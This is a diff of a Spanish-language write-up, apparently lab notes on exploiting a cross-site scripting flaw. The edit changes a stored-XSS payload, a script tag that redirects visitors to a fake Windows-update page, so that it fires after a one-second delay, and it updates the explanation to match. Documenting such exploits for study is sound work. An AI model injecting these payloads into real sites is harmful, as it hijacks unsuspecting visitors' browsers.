@@ -105,12 +105,12 @@ A continuación se muestra la explotación 2.
 **Payload utilizado**
 
 ```html
-<script>window.location='https://fakeupdate.net/win10ue/'</script>
+<script>setTimeout(() => {window.location.href = "https://fakeupdate.net/win10ue/";}, 1000);</script>
 <h2 style="color:red;">Explotación 2</h2>
 ```
 **Explicación**
 
-- Este ataque utiliza JavaScript para redirigir automáticamente al usuario a otra página web mediante: `window.location`.
+- Este ataque utiliza JavaScript para redirigir automáticamente al usuario a otra página web después de un segundo mediante: `window.location`.
 - Debido a la vulnerabilidad XSS, el script se ejecuta cuando la página muestra el comentario.
 
 **Impacto**  
